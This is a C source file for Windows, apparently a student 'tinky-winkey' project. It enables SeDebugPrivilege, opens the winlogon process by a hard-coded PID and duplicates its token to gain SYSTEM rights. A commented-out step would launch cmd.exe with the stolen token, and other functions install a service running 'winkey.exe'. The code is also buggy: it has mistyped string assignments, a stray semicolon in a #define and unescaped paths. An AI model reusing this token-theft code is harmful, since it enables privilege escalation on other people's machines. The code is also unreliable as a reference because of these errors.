#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define SVCNAME "tinky";

//  Forward declarations:
BOOL GetProcessList( );
BOOL ListProcessModules( DWORD dwPID );
BOOL ListProcessThreads( DWORD dwOwnerPID );
void printError( TCHAR* msg );

// DWORD : type d'int utilise pour PID sur win


BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

// char* get_username()
// {
// 	TCHAR username[UNLEN + 1];
// 	DWORD username_len = UNLEN + 1;
// 	GetUserName(username, &username_len);
// 	std::wstring username_w(username);
// 	std::string username_s(username_w.begin(), username_w.end());
// 	return username_s;
// }

void impersonateUserToken()
{
    HANDLE winlogonTokenHandle;
    HANDLE winlogonDuplicateTokenHandle;

    DWORD WINLOGON_PID = 1412;

	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));

    HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, "SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}

    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, WINLOGON_PID);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	
	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &winlogonTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	
	CloseHandle(processHandle);

	// BOOL impersonateUser = ImpersonateLoggedOnUser(winlogonTokenHandle);
	// if (GetLastError() == NULL)
	// {
	// 	printf("[+] ImpersonatedLoggedOnUser() success!\n");
	// 	//printf("[+] Current user is: %s\n", get_username().c_str());
	// 	printf("[+] Reverting thread to original user context\n");
	// 	RevertToSelf();
	// }
	// else
	// {
	// 	printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
	// 	printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	// }	

	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(winlogonTokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &winlogonDuplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}

	//CreateService();

	// Call CreateProcessWithTokenW(), print return code and error code
	// BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
	// if (GetLastError() == NULL)
	// 	printf("[+] Process spawned!\n");
	// else
	// {
	// 	printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
	// 	printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	// }


    CloseHandle(winlogonTokenHandle);
	CloseHandle(winlogonDuplicateTokenHandle);
    // Get a handle to the SCM database. 

}

void installService()
{
	printf("about to start\n");
	SC_HANDLE schSCManager;
	SC_HANDLE schService;
    TCHAR servicePath = "D:\42\tinky-winkey\winkey\winkey.exe";   
	TCHAR serviceName = SVCNAME;
	schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 


    if (NULL == schSCManager) 
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
	printf("opened\n");

  
	schService = CreateService( 
        schSCManager,              // SCM database 
        serviceName,                   // name of service 
        serviceName,                   // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_DEMAND_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        servicePath,                    // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 
 
	printf("creatededed\n");
    if (schService == NULL) 
    {
        printf("CreateService failed (%d)\n", GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }
    else printf("Service installed successfully\n"); 
	printf("installeded\n");

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);

}

void startService()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;
    TCHAR servicePath = "D:\42\tinky-winkey\winkey\winkey.exe";   
	TCHAR serviceName = SVCNAME;
	schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 


    if (NULL == schSCManager) 
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
	printf("opened\n");


    schService = OpenService( 
        schSCManager,         // SCM database 
        serviceName,            // name of service 
        SERVICE_ALL_ACCESS);  // full access 
 
    if (schService == NULL)
    { 
        printf("OpenService failed (%d)\n", GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    

	printf("creatededed\n");
    if (schService == NULL) 
    {
        printf("CreateService failed (%d)\n", GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }
    else printf("Service installed successfully\n"); 
	printf("installeded\n");

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);

}

int main()
{
	impersonateUserToken();
    return 0;
}